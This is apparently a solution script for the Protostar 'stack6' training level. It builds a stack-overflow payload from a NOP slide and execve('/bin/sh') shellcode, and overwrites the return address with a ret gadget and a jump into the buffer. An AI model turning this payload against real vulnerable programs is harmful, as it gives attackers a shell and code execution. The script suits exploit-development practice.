#!/usr/bin/python2.6

import struct

DEBUG = True
# DEBUG = False

buffer_sz = 64
ovw_stack_frame_sz = 76 # Overwritable stack frame, starting from buffer until we reach ebp (exclusive) 

if DEBUG:
    buffer_address = 0xbffff75c # As taken with the command: user@protostar:/opt/protostar/bin$ gdb stack6
else:
    buffer_address = 0xbffffddc

text_section = ""
if DEBUG:
    text_section += "\xCC"

# shellcode taken from shell-strom.
# Title:	Linux x86 execve("/bin/sh") - 28 bytes
# Author:	Jean Pascal Pereira <pereira@secbiz.de>
# Web:	http://0xffe4.org
text_section += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

nop_bytes=buffer_sz-len(text_section)
nop_slide = "\x90"*nop_bytes
assert(len(text_section) + len(nop_slide) == buffer_sz)

ebp = struct.pack("P", 0x00000000)
eip = struct.pack("P", 0x80484f9) # getpath+117: ret
eip2 = struct.pack("P", buffer_address+len(nop_slide)/2) # Jump somewhere in the nop slide

# payload structure:
# Inside buffer: nop_slide, text_section
# Outside buffer, until we reach the end of the stck frame: 0x414141...
# [ebp]   <-- 0x00000000
# [ebp+4] <-- eip
# [ebp+8] <-- eip2
# [ebp+12] <-- \0 (Due to gets() reading EOF and replacing it with \0)
payload = nop_slide + text_section + "\x41"*(ovw_stack_frame_sz-buffer_sz) + ebp +eip + eip2

print(payload)
